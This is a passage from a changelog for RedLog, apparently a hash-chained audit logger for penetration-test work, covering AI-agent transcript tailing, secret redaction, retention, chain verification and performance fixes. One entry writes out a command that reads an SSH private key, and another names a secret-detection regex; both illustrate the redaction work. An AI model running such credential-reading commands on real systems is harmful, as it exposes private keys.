  serves the read from RAM, so per-event refresh is one number
  copy + one rerender.

### Deferred to v0.7.6+
- Historical event `4239af54-...` (2026-08-01, pre-v0.7.x) trips
  `chain_sample_broken` — hash doesn't match any known shape variant.
  Not tailer-caused; investigation deferred. Likely a schema variant
  from a pre-canonical era that our shape-attempt list is missing.

## v0.7.4 — 2026-08-07
Post-review defect batch. Seven fixes surfaced by two-axis code review
(standards + spec) of the v0.7.2 tailer + v0.7.3 hook-retirement work.
All defects, no new features.

### Correctness / security
- **F1** — `outputIfPathHiddenByCommand` now receives the sibling
  tool_call's actual command, not the tool_result's own output
  (`agent-transcript-tailer.ts:emitTurn`). Pre-v0.7.4 we passed
  `output` as both args and the helper checked the OUTPUT for
  `.ssh/` / `.env` — so `cat ~/.ssh/id_rsa` leaked key contents
  whenever they didn't happen to contain the literal path string.
  New per-session LRU cache `toolCommandByUseId` (cap 1000) memoises
  each tool_use's command so its later tool_result gets the right
  input to the hint check. Cache miss falls back to the old
  output-scans-itself behaviour, which is at least no worse than
  before.
- **F2** — Retention default `agentTranscripts.keepDays` flipped
  from 30 → 0 (keep forever unless opted in), matching
  cast/screenshot conventions (`retention.ts:110`). Belt-and-
  suspenders: `registerSession` now **seeds `redlogIdByUuid` from
  the events table at open time** (`agent-transcript-tailer.ts:registerSession`).
  If a sidecar is ever pruned (by policy, by disk pressure, by
  operator hand), the DB-side seed prevents every historical turn
  from being re-inserted as fresh chained events on next open.
- **F3** — `tool_input` redaction now deep-walks every string value
  (`agent-transcript-tailer.ts:deepRedactStrings`). Pre-v0.7.4 only
  the top-level keys `['command','content','code','query']` were
  scanned; `Edit.old_string`, `Edit.new_string`, MCP nested args,
  arrays-of-objects all bypassed. Operator pasting an API key into
  `Edit.new_string` no longer lands unredacted.

### Consistency
- **F4** — `unregisterSession` honours `eventBus.paused`
  (`agent-transcript-tailer.ts:unregisterSession`). Pre-v0.7.4 the
  v0.7.3 A2 pause gate was on `catchUpSession` only — tearing down
  a session while paused still wrote two `agent.*` events per
  session. Now the session is removed from the map but no event
  fires until recording resumes and a fresh session catches back up.
- **F5** — Misleading "no double-emit; no missed events" comment
  replaced with an honest tradeoffs paragraph (`agent-transcript-tailer.ts:catchUpSession`).
  Actual guarantee: append-then-emit means a mid-emit crash silently
  drops those turns; F2's DB seed catches most reset paths but not a
  crash inside the parse loop. The opposite append order trades in
  the other direction; F2 makes either acceptable.
- **F7** — Two docstring lies corrected. `AgentTailerConfig.selfExclusionMarker`
  no longer claims "written by the Electron main on first launch"
  (nothing writes it); `.redlog-app-root` no longer claims an
  `enableSelfTail: true` config knob exists (it never did).

### Coverage
- **F6** — `test/redaction.test.ts` restored with unit tests for
  `src/core/redaction.ts`. v0.7.2's file-rename accidentally left
  the still-live four-layer redaction module (used by
  clipboard-monitor + main/index's `configureRedaction`) with zero
  test coverage. New file covers `redact` (entropy + denylist +
  allowlist + malformed-regex path), `maskText` (single/multiple/
  unsorted/custom-char), `shannonEntropy`, and the plugin rules
  registry.

## v0.7.3 — 2026-08-07
Post-v0.7.2 follow-through. Retires the Claude Code hook's per-tool
ingest now that the transcript tailer covers everything, plus two
correctness fixes the v0.7.2 code-review flagged.

### A — Retire `hooks/claude-code-hook.sh` per-tool emit
- Script is now a no-op stub (`hooks/claude-code-hook.sh:1`). Its
  entire python + curl body — the one that POSTed a
  `claude_code_bash` event per Bash tool call — is replaced with a
  short comment explaining the handoff and `exit 0`.
- `PLUGIN_REGISTRY` in `src/core/hooks-manager.ts` no longer offers
  the `claude-code` plugin. New installs skip wiring
  `~/.claude/settings.json`; existing wired installs still work (the
  stub just exits 0), they just waste one process spawn per Bash call
  until the operator re-runs the install flow.
- **Fixes:** the "three rows per bash call" Timeline pollution the
  code-review adversarial pass flagged as High. From v0.7.3 the
  tailer is the sole source of Claude Code tool ingest — one
  `agent.tool_call` + one `agent.tool_result` per Bash, same 100ms
  latency (chokidar fires on transcript file write immediately).
- **Side effect:** the shell hook's inline Python redactor is gone,
  so `test/secret-redaction.test.ts` drops the byte-parity mechanism
  and tests the TS redactor directly with the same golden fixtures.
  Also documents two order-precedence caveats (Bearer + JWT prefixed
  with `token:` get caught by the earlier `authorization|token[=:]+\S+`
  rule and land as `[REDACTED]` instead of the more-specific marker).

### A2 — Tailer correctness patches
- `catchUpSession` gates on `eventBus.paused` (`agent-transcript-tailer.ts:catchUpSession`)
  — matches how screenshot-agent, process-monitor, and clipboard-monitor
  already respect the operator's recording toggle. When paused, the
  source `.jsonl` grows normally; the next chokidar tick after resume
  catches up from the sidecar offset with no loss.
- `unregisterSession` emits an explicit `agent.session_end` event on
  transcript unlink / tailer shutdown (`agent-transcript-tailer.ts:unregisterSession`).
  Closes the L1 "no session terminus" note from the adversarial review
  — chain-anchor walks now have a clean boundary per agent session,
  matching the v0.6.90 E Timeline session-divider treatment for shell
  sessions.

### Deferred to v0.7.4
- OpenCode transcript tailer variant — OpenCode's transcript layout
  differs enough to warrant its own scoping pass.
- Codex plugin update — same story.
- Install v0.7.3 DMG end-to-end verification (manual UI test) — the
  tailer works in unit tests; verifying on a real Claude Code session
  is a post-release smoke test.

## v0.7.2 — 2026-08-07
Agent-transcript tailer + verbatim sidecar. Extends AI-agent audit
coverage from "we logged that a bash tool fired" to "we logged the
prompt, the response, every tool call and its full result." Passed
two-agent design review + prior-art web survey (inspired by Tailward
on PyPI — our differentiator is the hash-chained tamper-evident copy).

### A — Agent transcript tailer (`src/main/services/agent-transcript-tailer.ts`)
- Watches `~/.claude/projects/**/<session>.jsonl` via chokidar. For
  each session:
  - **Append-only sidecar** at `<projectDir>/agent-transcripts/claude-code-<session>.jsonl`
    — the sidecar's `stat().size` is the source of truth for read
    offset, so a crash between read and DB insert is idempotent by
    construction (no double-append).
  - **Per-turn events** derived from each new transcript line:
    `agent.user_message`, `agent.assistant_message`, `agent.tool_call`
    (full tool_input, MCP server prefix auto-extracted), `agent.tool_result`
    (up to 100KB, `truncated:true` flag beyond). Off-by-default
    `agent.thinking` for thinking blocks. Free-win fields captured
    when present: `model`, `agent_version`, `git_branch`, `prompt_id`,
    `is_sidechain`, `permission_mode`, `usage_tokens_in/out`.
  - **`_causes` linking via RedLog event ids** — per-session
    `Map<transcriptUuid, redlogEventId>` so child events point at
    parent RedLog rows, not foreign Claude Code UUIDs. Focus-chain
    mode (`f`) walks the whole conversation as a single graph.
  - **Snapshot events** on 15s idle + session close — payload carries
    the sidecar's cumulative sha256 so post-hoc tamper is detectable
    against the hash chain.
  - **`/compact` + `/clear` handled** — source shrunk = emit
    `transcript_compacted`, reset sidecar; subsequent turns tagged
    `post_compact:true`. Adopted from Tailward's edge-case catalog.
  - **Partial-line buffer** — trailing bytes without `\n` held for
    next chokidar tick so a mid-write JSON parse never trips.
  - **Schema drift advisory** — unknown line types fire
    `agent.transcript_schema_drift` once per session (Anthropic marks
    the JSONL schema as "internal, can break between releases"; we
    stay defensive without hard-failing).
- **Redaction pre-insert** — `src/core/secret-redaction.ts` ports the
  Python secret regex from `claude-code-hook.sh` line-for-line. New
  `test/secret-redaction.test.ts` runs 12 golden fixtures through
  BOTH the shell hook's Python and the TS port and asserts
  byte-identical output — any drift trips CI. The sidecar file stays
  verbatim (raw evidence copy); redaction only touches the string
  going into the events table.
- **Privacy gates**:
  - Uses the same `~/.redlog/hook-config.json` `excludedPaths` /
    `watchPaths` as the shell hook.
  - **Self-exclusion** via `.redlog-app-root` marker file (committed
    at repo root) — the tailer walks up from each session's
    transcript-recorded cwd and skips any that live inside RedLog's
    own dev tree. Fixes the "watching your own conversation writing
    RedLog code" feedback loop.

### F — Retention + bundle exclusion
- `src/core/retention.ts` extended: `agent-transcripts/*.jsonl`
  sweeps with 30-day default keep (`config.agentTranscripts.keepDays`).
  Deletion emits `system.agent_transcript_pruned` audit event
  matching the cast/screenshot retention pattern.
- `src/core/bundle-export.ts` — new `ExportBundleOpts.includeAgentTranscripts`
  flag, **default false**. Sidecar `.jsonl` files ship in the bundle
  only when explicitly opted in — the DB events (redacted) already
  ride along and the `agent.transcript_snapshot` events' sha256
  lets auditors verify integrity without seeing the raw prompts.

### Cancelled from Tier 1
- **B** (drop Claude Code hook's Bash-only matcher) — subsumed by A.
  The hook still emits per-Bash `claude_code_bash` events in this
  release; tailer emits the same actions as `agent.tool_call` +
  `agent.tool_result`. Operators see BOTH (real-time vs. complete).
  v0.7.3 will add a hook mode toggle so the hook can defer per-tool
  ingest to the tailer.
- **C** (OpenCode `chat.after` handler) — deferred to v0.7.3.
  OpenCode's transcript conventions differ enough to warrant its own
  scoping pass.
- **D** (500 → 100KB output_preview cap in hook) — tailer already
  caps at 100KB natively. If v0.7.3 retires the hook per B, D
  becomes moot.

### Prior art credit
Design informed by [Tailward](https://pypi.org/project/tailward/)
(local Claude Code JSONL → SQLite ledger, regex secret redaction,
`isCompactSummary` handling). Our differentiator: SHA-256 hash chain
covering every derived event AND the sidecar file; local-only, no
outbound telemetry.

## v0.7.1 — 2026-08-07
Polish batch from the v0.7.0 install-and-click-through session. Three
fixes; no schema change, no wire change.

- **P1** — LootPanel header count now matches what the panel actually
  renders (`LootPanel.tsx:71`). Pre-v0.7.1 the header read
  `loot.getCount()` which is the live-detection in-memory dedup
  set — empty on a fresh launch even when historical loot events
  exist in the DB. That gave a `戰利品 (0)` header with 2 rows visible
  below. Header now counts the post-filter, post-dedup matches; the
  rendered list uses the same `useMemo`ised source so they can never
  drift. Also drops the now-unused `loot:getCount` IPC read from the
  panel.
- **P2** — `capture.claudeCode` gets a zh/en parenthetical so the
  Dashboard's capture-health source list reads consistently. Pre-v0.7.1
  it sat as bare `Claude Code hook` while neighbours had
  `Shell hook（你的終端機）` / `mitmproxy（HTTP 流量）` context. Now
  `Claude Code hook（AI 代理）` / `Claude Code hook (AI agent)`.
- **P3** — `chain-anchor.ts` hash-shape build extracted into a shared
  `buildHashShapes(row, parsedData)` helper called by both
  `verifyRowHash` (full walk) and the random-sample verify path
  (`chain-anchor.ts:441`, `:832`). Closes the deferred TODO the
  code-review skill flagged as Duplicated Code. If a new shape variant
  is ever added, there's now one edit surface — the two attempt lists
  still live at their call sites because they need different outputs
  (walker also derives `canonicalJsonForSig` for signature verify,
  sampler doesn't).

## v0.7.0 — 2026-08-06
Minor bump — no new code beyond v0.6.100, ships as the landing point
for a four-release perf/hardening run (v0.6.97 → v0.6.100). Read the
per-release sections below for line-item detail; this entry is the
"upgrade from v0.6.96" summary.

### Highlights since v0.6.96
- **Perf** — screenshots stream from disk via a `redlog-screenshot://`
  custom protocol (no more base64 IPC round-trip per thumb); grid
  thumbs `loading="lazy"` + `decoding="async"`; screenshot writes
  moved off the main thread; `SELECT COUNT(*)` on the events table
  replaced by an in-memory counter kept in lockstep with inserts;
  deconfliction webhook now coalesces up to 100 events into one
  POST with a 500ms flush window (was per-event); Linux
  `process-monitor` runs `ps -w -w` so the command column no longer
  truncates at 80 cols; Timeline broken-chain lane chip auto-hides
  when empty on internal engagements.
- **Cross-platform** — Windows `process-monitor` implementation via
  `Get-CimInstance Win32_Process` (was a `process_monitor_unsupported`
  advisory stub through v0.6.97).
- **UX** — CaptureHealthCard shows per-source "Ns / Nm ago"
  freshness with colour-scaled age and a 1s tick between health
  polls; every per-project Timeline setting (anomaly filter,
  focus-anchor, `/`-filter query, hidden lanes) is now keyed by
  project id — flipping the filter on in Project A no longer bleeds
  into Project B. Legacy unscoped values migrate once per project
  on first mount.
- **Security** — `screenshot:read` IPC + preload shim + main handler
  removed (no in-tree caller after the URL-scheme move; shrinks the
  renderer→main attack surface). Deconfliction batch config now
  snapshotted at first-event-in-batch, so a mid-batch URL rotation
  can't route buffered events canonicalised under the OLD cfg to
  the NEW endpoint.
- **Durability** — deconfliction now flushes the pending batch on
  `will-quit` (before v0.6.100, up to 100 events could vanish on
  quit).

### Breaking changes
- **Deconfliction wire format** — receivers must accept
  `Array<Event>` bodies. Pre-v0.6.97 the body was one canonicalised
  event; v0.6.97 A coalesced to an array. If you have a webhook
  receiver deployed, update it to iterate over the array before
  upgrading. The `testWebhook` pre-flight still fires a single-event
  body for connectivity checks.

### Post-release verification
The full v0.6.96→v0.6.100 diff was reviewed via the `code-review`
skill (standards + spec axes in parallel sub-agents). Six defects
surfaced; all fixed in v0.6.100 before this roll-up:
- deconfliction shutdown flush
- deconfliction batch config snapshot timing
- Windows process-monitor spurious `process_exit` for its own
  poll-spawned PowerShell
- `redlog-screenshot://` sync read on main thread
- Timeline per-project localStorage silently dropped writes when
  `project.active()` resolved null
- Timeline migration effect clobbered in-flight user edits

## v0.6.100 — 2026-08-06
Post-review defect batch. Six fixes surfaced by two-axis review of the
v0.6.97-99 diff (spec + standards, parallel sub-agents). No new
features — every item is a bug in the prior three releases.

### Durability
- **F1** — Deconfliction now flushes its pending batch on `will-quit`
  (`main/index.ts:1826`, `deconfliction.ts:141`). v0.6.97 A opened
  the buffered path but never wired shutdown drain; up to 100 events
  (or ≤500ms worth) vanished when the operator quit mid-engagement.

### Correctness
- **F2** — Batch config captured at first-event-in-batch, not
  per-event (`deconfliction.ts:135`). Pre-v0.6.100 the assignment
  ran on every notify, so a mid-batch webhook URL rotation would
  POST events canonicalised under the OLD cfg (filtered by old
  `events`/`includeData`) to the NEW cfg's endpoint. Now the
  snapshot belongs to whichever cfg opened the batch.
- **F3** — Windows process-monitor no longer fires a spurious
  `process_exit` for its own PowerShell every 2s
  (`process-monitor.ts:166`). Root cause: `collectDescendants` only
  walks live pids via `nowMap`, so a dead descendant that landed in
  `knownProcs` last tick couldn't be filtered next tick — it
  appeared as an exit. Fix: exclude own descendants from the
  `knownProcs` snapshot itself. Applies to both write sites (poll
  body + saturated-branch). Also collapses the duplicated
  win32-vs-default poll interval math into two named locals.

### Perf
- **F4** — `redlog-screenshot://` protocol handler swapped
  `fs.readFileSync` → `fs.promises.readFile` (`main/index.ts:684`).
  With v0.6.98 A lazy-loading, 500 thumbs burst-fire requests as
  ScreenshotsView scrolls; each blocked main 5-15ms. Same fix
  v0.6.97 D applied to screenshot-agent writes.

### UX
- **F5** — Timeline per-project localStorage now falls back to a
  `__global__` sentinel when `project.active()` resolves null
  (`Timeline.tsx:511`). Pre-v0.6.100 all scoped writes silently
  dropped when there was no active project (first-launch, DMG
  demo, e2e). Sentinel means toggles still persist.
- **F6** — Migration effect ref-guards against re-runs
  (`Timeline.tsx:513`). Pre-v0.6.100 a user typing in the
  `/`-filter box between mount and `project.active()` resolution
  would have their input clobbered when the effect fired and
  called `setFilterQuery(legacy)`. Now `migrationAppliedFor`
  records the projectId we've handled; effect no-ops on re-run.

## v0.6.99 — 2026-08-06
Follow-through on v0.6.98. Three tight items: extend per-project
scoping to the rest of Timeline's localStorage, add a per-second
tick to the freshness stripe, back-fill unit tests for the Windows
process-monitor parser.

### UX
- **A** — Timeline's `focus-anchor`, `filter-query`, and `hidden-lanes`
  now scope by projectId, same pattern as v0.6.98 E scoped
  `anomaly-filter`. Zoom, detail panel height, follow mode, session
  dividers, and timezone stay global — those are UI/display
  preferences that shouldn't reset per project. One-shot migration
  from legacy unscoped keys runs on first mount per project so
  operators upgrading from < v0.6.98 keep whatever they had set on
  the first project they open.
- **B** — CaptureHealthCard freshness ages tick every 1s
  (`App.tsx:238`). Pre-v0.6.99 the age was computed against
  `capture.checkedAt`, which only refreshes on the 5s health poll,
  so "5s ago" sat frozen for 5 real seconds then jumped to "10s
  ago" — read as broken. Now a 1s `setInterval` forces the rerender.

### Quality
- **C** — Unit tests for `parseWindowsPsOutput` (5 cases: normal
  row, CRLF, `|` in CommandLine tail, malformed / empty lines,
  realistic multi-process capture) (`test/process-monitor.test.ts`).
  v0.6.98 D shipped the Windows path untested; this back-fills the
  parser (the PowerShell spawn itself isn't unit-testable on the
  darwin/linux CI runners, but the parse layer is pure and now
  covered). Suite: 360 → 365.

## v0.6.98 — 2026-08-06
Follow-through on v0.6.97 + Windows process-monitor parity. Five items,
no schema change, one small IPC removal.

### Perf
- **A** — ScreenshotsPanel thumbs render with `loading="lazy"` +
  `decoding="async"` (`App.tsx:666`). v0.6.97 B stopped inflating the
  bytes but 500 `<img>` tags still mounted eagerly; Chromium now
  defers fetch/decode to when a tile nears the viewport. Cold panel
  open on 500 shots drops steady-state RAM ~150MB and the paint stall
  goes away. Works on the `redlog-screenshot://` custom scheme.

### Security
- **B** — `screenshot:read` IPC + preload shim removed
  (`preload/index.ts:69`, `main/index.ts:1034`). Dead code after
  v0.6.97 B — no in-tree caller. Deleting it means a compromised
  renderer with `filePath` control can no longer coax a base64-encoded
  read of any file under `<projectDir>/screenshots/`. `redlog-screenshot://`
  is the only surviving read path and it enforces basename-only
  resolution + `isInsideDir`.

### UX
- **C** — CaptureHealthCard now shows a per-source freshness stripe:
  "Ns / Nm / Nh ago" next to each source's state, colour-scaled
  (emerald <60s, amber <5m, zinc otherwise) (`App.tsx:238`). An
  active source that hasn't fired in 45s used to look identical to
  one that fired 200ms ago — now the age is at-a-glance.
- **E** — Timeline anomaly filter localStorage key now includes
  the project id (`Timeline.tsx:498`). Pre-v0.6.98 the key was
  global — enabling the filter in Project A followed you into
  Project B. Migrates the legacy unscoped value once per project
  on first mount, so existing operators don't lose their setting.

### Cross-platform
- **D** — Windows `process-monitor` polls `Get-CimInstance Win32_Process`
  via PowerShell (`process-monitor.ts:286`). Replaces the v0.6.92
  `process_monitor_unsupported` advisory. Poll interval floored at
  2000ms on win32 (cold PowerShell spawn is 800ms-1.5s). Pipe-delimited
  output, falls back to `Name` when `CommandLine` is null (elevated
  processes / SYSTEM PIDs without an admin token). Same diff/emit
  pipeline and ignore-list as the darwin/linux path.

## v0.6.97 — 2026-08-06
Perf/polish micro-batch. Six items: main-thread wins (screenshot IPC,
event count cache, async JPEG write, deconfliction coalescing) plus two
polish fixes (Linux `ps` truncation, empty external-only lane chips).
No API/schema change.

### Perf
- **A** — Deconfliction webhook coalesces events into an array flushed
  every 500ms (or at 100 events, whichever comes first) instead of one
  POST per event (`deconfliction.ts:100`). A 200 evt/s scan burst was
  firing 200 POSTs/s at the operator's SIEM with independent retry
  storms; now it's ≤2 POSTs/s carrying up to 100 events each. Body
  shape changes from `{event}` to `Array<Event>` — receivers must
  accept the array form. The v0.6.95 CHANGELOG called this out as a
  follow-up; here it is.
- **B** — Screenshots now stream from disk via a `redlog-screenshot://`
  custom protocol registered at main-process ready
  (`src/main/index.ts:660`) instead of piping a 33%-inflated base64
  data URI through IPC per thumb (`App.tsx:587`). Rendering a
  Screenshots panel with 500 thumbs previously blocked on 500 IPC
  round-trips + 500 base64 encodes; now Chromium streams JPEG bytes
  directly. Path guarded by `isInsideDir(<project>/screenshots)`;
  requests for anything outside 404. `screenshot:read` IPC kept for
  callers still passing full paths (nothing in-tree uses it after
  this change).
- **C** — `getEventCount` seeds once from `SELECT COUNT(*)` then
  increments in-memory on every successful insert (`db/events.ts:430`).
  StatusBar polls every 5s and the dashboard renders drive multiple
  calls per second — with 200k rows the full scan cost 40-80ms per
  call and pinned the main thread. Cache invalidates on project
  switch (`resetSession`) and on insert failure (mirrors the
  v0.6.95 prev-hash cache invariant).
- **D** — `screenshot-agent` swapped `fs.writeFileSync` →
  `fs.promises.writeFile` (`screenshot-agent.ts:99`). A 4K JPEG at
  quality=80 lands 800KB-1.5MB and blocked main for 5-15ms per shot;
  now the syscall runs on libuv's thread pool. Not visible on the
  10s periodic timer alone, but marker + idle + manual bursts
  stacked into jank spikes.

### Polish
- **E** — Linux `process-monitor` now runs `ps -w -w -eo …` so the
  command column doesn't truncate at 80 cols
  (`process-monitor.ts:286`). procps trimmed argv at the inherited
  terminal width, losing the args scope-match relies on. macOS BSD
  ps ignores unknown flags so the darwin path is unchanged; Alpine
  BusyBox path is still covered by the CP-2 advisory.
- **F** — `EXTERNAL_ONLY_LANES` (`credential_use`, `c2_checkin`)
  chips are hidden entirely when the lane is empty
  (`Timeline.tsx:1889`). Pre-v0.6.97 they showed dimmed with a
  tooltip; on a laptop-only pentest they'll never populate and
  just cluttered the chip row. They auto-reappear once a real
  event lands.

## v0.6.96 — 2026-08-06
Cleanup batch — 13 P1/P2 items from the 5-agent audit that weren't
picked for v0.6.93/94/95. Zero user-facing change; every item is a
bug fix, security hardening, label clarity, or dead-code removal.

### Security
- **Sec-1** — `/api/export/bundle` error response no longer returns
  `err.stack` (`api-server.ts:743`). Stack stays in console.error.
  Info leak: absolute paths + module layout to any token holder.
- **Sec-2** — `~/.redlog/keys/` created with mode `0o700` (was
  inheriting umask 0o755). Files inside are already 0o600 so contents
  were never readable, but directory listing leaked operator ids. Also
  `chmod` on already-existing dirs. Windows: no-op (POSIX perms).

### Cross-platform
- **CP-1** — Windows `SHELL=/usr/bin/bash` (Git Bash) is now rejected;
  falls back to `powershell.exe`. Prior: pty.spawn crashed with an
  inscrutable error when RedLog was launched from a Git Bash shortcut.
  Same class as the v0.6.82 cwd-from-HOME fix.
- **CP-2** — `process-monitor` now emits a one-shot
  `system.process_monitor_ps_unavailable` advisory when `ps` fails
  (Alpine BusyBox `ps` doesn't accept procps-style `-eo pid=,ppid=,…`).
  Mirrors the existing Windows-unsupported advisory so the empty lane
  has a visible reason.

### Ops
- **Ops-1** — `Whitelist` / `Blacklist` labels renamed to `Safe IPs` /
  `Exposed IPs` everywhere. Placeholders in Settings and ProjectPicker
  updated; overlay + ip.* hints too. Vocabulary now matches the
  `ipSafety` verdict the app already emits (`safe / exposed / unknown`).
- **Ops-2** — Saved Timeline views ride along with `config:exportProfile`
  and merge into the local `views.json` on import. Team hand-off no
  longer loses the sender's zoom / filter bookmarks. Merge is
  id-keyed (imported wins on collision).
- **Ops-3** — CaptureHealthCard verdict now tips to `partial` when
  any source that's *expected to feed* is currently idle, even if
  another source is active. Prior: shell-hook installed but silent for
  hours still read as "healthy" green if builtin-terminal was active.

### Latent bugs
- **Bug-1** — Plugin host `events.query` shim was passing `type` and
  `target` but core `queryEvents` reads `agentType` / `targetId` —
  filters were silently dropped and plugins got a random 50-row window.
  Shim now renames the fields (`main/index.ts:391`).
- **Bug-2** — New `queryEventById(id)` in `db/events.ts` — O(1) hash
  index scan. Replaces `queryEvents({limit: 5000}).find(id === X)` at
  3 sites (`api-server.ts:671`, `main/index.ts:1347`, `:1376`). Events
  older than the newest 5000 rows were reporting "not found" on replay.

### Cleanup
- **Clean-1** — Removed `vis-timeline` / `vis-data` dependencies. No
  imports anywhere.
- **Clean-2** — Removed `getPrimaryOperatorSnapshot` (`api-server.ts:979`)
  and `findCauseSession` + `sessionCache` + `refreshSessionCache`
  (`process-monitor.ts`). All dead: the snapshot fn was never called;
  the ppid→session mapping always returned undefined (needs env-var
  access ps doesn't give). Wall-clock proximity fallback stays in
  Timeline.
- **Clean-3** — `RedLogAPI.views` no longer `?` optional. Preload has
  always exported it since v0.6.90 D; the `?` was leftover from day 1
  when the shim was optional. Timeline drops its `as unknown as`
  cast and reads `window.redlog.views` directly.
- **Clean-4** — `App.tsx` screenshot-deleted handler prefers
  `data._causes[0]` over legacy `data.source_event`. Main-process
  write still dual-writes both for now — external consumers (deconfliction
  subscribers, redlog-verify.py) may still read the legacy field.
  Drop main-side after one more release.

Tests: 360 unit / 17 e2e / build clean.

## v0.6.95 — 2026-08-06
Perf + `_causes` bundle — 6 items from the post-v0.6.92 audit. Backend
+ Timeline rederivation; no new UI.

### A. `_causes` wire audit — no code change
Traced every `insertEvent('pivot'|'cleanup'|'file_transfer'|'loot'`
site. All four companions already stamp `_causes` correctly (landed
v0.6.89). Ops reviewer's finding was stale. `file-watcher.ts:133`
intentionally leaves `_causes` unset — no triggering shell in scope.

### B. `verifyChainFull` — chunked + lazy shape build
- **File**: `src/core/chain-anchor.ts`
- **Symptom**: sync SHA-256×6 shapes + Ed25519 verify per row → 10-30s
  block at 100k rows; renderer freezes.
- **Fix 1 (lazy)**: hashes now compute newest-first and short-circuit
  on match. Modern rows match the first shape (v0.6.88 canonical), so
  5 of 6 SHA-256s never fire. ~4-6× speedup on typical chains.
- **Fix 2 (yielding)**: new `verifyChainFullAsync` yields via
  `setImmediate` every 1000 rows. Sync `verifyChainFull` kept for
  tests + backward compat.
- **IPC wire**: `chain:verify` + `/api/anchors/verify` route to the
  async version.
- Deviation: picked `setImmediate` over `worker_threads` — better-sqlite3
  handles aren't easily shareable to workers, and the sample walker
  already runs on the main thread.

### C. `created_at` index + `lastHash` cache
- `src/core/db/index.ts`: `CREATE INDEX IF NOT EXISTS idx_events_created_at ON events(created_at)`.
- `src/core/db/events.ts`: sentinel-guarded module-level `cachedLastHash`
  + `ensureLastHash()`. Seeded once from DB on first use, refreshed
  after every successful insert. Any INSERT error resets to
  `SENTINEL_UNSEEDED`. `resetSession()` (called by `initDB`) clears so
  project switches don't leak cache across projects. `_resetLastHashCache()`
  exported for tests.

### D. IPC coalescing — `events:new-batch`
- **File**: `src/main/index.ts:942` — `batchBuffer` accumulates events,
  `setImmediate(flushBatch)` sends `Array<RedLogEvent>` on
  `events:new-batch`. Per-event `events:new` still fires so
  deconfliction webhook + overlay pivot HUD subscribers keep working.
- **Preload**: `events.onNewBatch(cb)` added; `events.onNew` unchanged.
- Deconfliction webhook coalescing left as follow-up per plan.

### E. `readCastSlice` streaming
- **File**: `src/core/cast-slice.ts`
- **Before**: `fs.readFileSync` + `split('\n')` + `JSON.parse` per
  line → peak ~200MB for a 50MB cast. Two concurrent replays cracked
  8GB Electron.
- **After**: `fs.createReadStream` + `readline.createInterface` —
  line-by-line. `stream.destroy()` on first out-of-window event
  (file is time-ordered, so nothing later falls back inside).
  `crlfDelay: Infinity` handles Windows-authored casts.
- **Signature**: now `Promise<CastSlice | null>`. Callers awaited
  (`api-server.ts:699`, `main/index.ts:1294,1330`).
- 50MB cap (v0.6.93 P0-G) still bails early.

### F. Timeline rederivation + plugin lane deps
- **File**: `src/renderer/src/components/Timeline.tsx`
- **Fix 1 (bug)**: added `pluginTypes` to deps for `populatedLanes`,
  `laneEvents`, `recentEvents` useMemos — plugin-registered event
  lanes now show up on first render instead of after any unrelated
  state change.
- **Fix 2 (perf)**: `Array.from(map.values()).sort(eventCompare)` on
  every event rebuild → replaced with `sortedRef` maintained via
  `binarySearchInsert`. Fast path: `sortedRef.current.push(evt)` when
  new event's timestamp ≥ last (the normal live-stream case). Cold
  path: binary search + splice. `loadMore` binary-inserts older rows.
- **Batch listener**: `useEffect` subscribes to `onNewBatch` if
  available (via v0.6.95 D), falls back to `onNew` per-event. Ingest
  dedupes against `eventsMapRef` so double broadcast is safe.

Tests: 360 unit / 17 e2e / build clean.

## v0.6.94 — 2026-08-05
Delivery + Windows parity. Four items from the 5-agent audit.

### A. PowerShell hook spool (parity with v0.6.87 A2 bash hook)
- **File**: `hooks/shell-hook.ps1`
- **Before**: fire-and-forget `Invoke-RestMethod` in runspace; if RedLog
  is closed, the throw is swallowed and the event is lost.
- **After**: foreground POST with `-TimeoutSec 2`; on failure writes
  payload to `$env:USERPROFILE\.redlog\pending\<epochNs>.<pid>.json`
  (5000-file cap). Filename ordering matches bash `%s%N` (19-digit
  epoch-ns), so the existing drain in `main/index.ts:441-469` picks
  up both languages' spool files in the same order.
- Windows operators no longer silently lose events when RedLog is
  closed.

### B. `Redlog-Run` PowerShell function (parity with v0.6.89 X)
- **File**: `hooks/shell-hook.ps1`
- Signature: `Redlog-Run <cmd> [args...]` — uses `$args` so `-flags`
  reach through without triggering PS parameter binding.
- External binaries → `Start-Process -RedirectStandardOutput/-Error`;
  cmdlets/functions → in-process `& $exe @args 1>… 2>…`.
- 100 KB cap per stream, UTF-8 decode with U+FFFD fallback for binary
  bytes. Emits `command_end` with structured `stdout/stderr/*_bytes/
  *_truncated/captured_by:'redlog-run'` — same schema as bash hook.
- Passthrough writes visible output back to the console before sending
  the event.

### C. Standalone client-side chain verifier (Python)
- **New**: `tools/redlog-verify.py` (~350 LOC, stdlib-only)
- Ports `canonicalStringify` (v0.6.88 canonical shape) to Python plus
  the 5 legacy JSON shapes so pre-v0.6.88 rows verify.
- Walks `events.jsonl` in order: `prev_hash` chain + v0.6.93 P0-A
  "NULL prev_hash after migration boundary" forgery guard + Ed25519
  signature (when available).
- **Ed25519 handling**: `try import cryptography.hazmat...Ed25519PublicKey`;
  if missing, prints an honest warning and skips sig verification —
  hash chain still catches content mutation. Bundling a hand-rolled
  Ed25519 verifier was a bigger correctness risk than an honest skip.
- **Bundle inclusion** (`src/core/bundle-export.ts`):
  - `operators.json` now includes `signerPubKey` (pubkey is not a
    secret; without it Python verifier can't check sigs at all)
  - Copies `redlog-verify.py`, `verify.sh` (POSIX), `verify.cmd`
    (Windows), and a small `README.md` into bundle root
  - Each hashed into `manifest.json.files`
  - Verifier source resolved across dev / packaged paths (mirrors
    `hooks-manager.ts` pattern)
- **New test**: `test/redlog-verify.test.ts` (2 tests). Populates a
  DB with signed operator + 5 events, exports a real bundle, invokes
  the Python verifier via `spawnSync`, asserts exit 0 + "Chain intact".
  Second test tampers `data.command`, asserts non-zero exit + "CHAIN
  BROKEN". Skips cleanly when `python3` isn't on PATH.

### D. Settings ▸ Data ▸ "Export Bundle" button
- **New IPC**: `data:exportBundle` (calls `exportBundle()`) +
  `data:revealPath` (uses `shell.openPath`)
- **UI**: new `ExportBundlePanel` component under "Export All Data"
  in Settings. Button label English/中文, `data-testid=
  "settings-export-bundle"`. Shows "Building bundle..." while
  disabled, then success toast + "Show in Finder / Explorer" button.
  Inline red error box on failure.

### Assumptions worth flagging
- `operators.json` bundle format now includes `signerPubKey` — additive,
  no existing consumer besides the bundle itself.
- Python verifier reimplements the 6 hash shapes from `chain-anchor.ts:
  verifyChainFull`. Future shape additions need matching entries in
  `_rebuild_shapes` — inline note left in the .py.
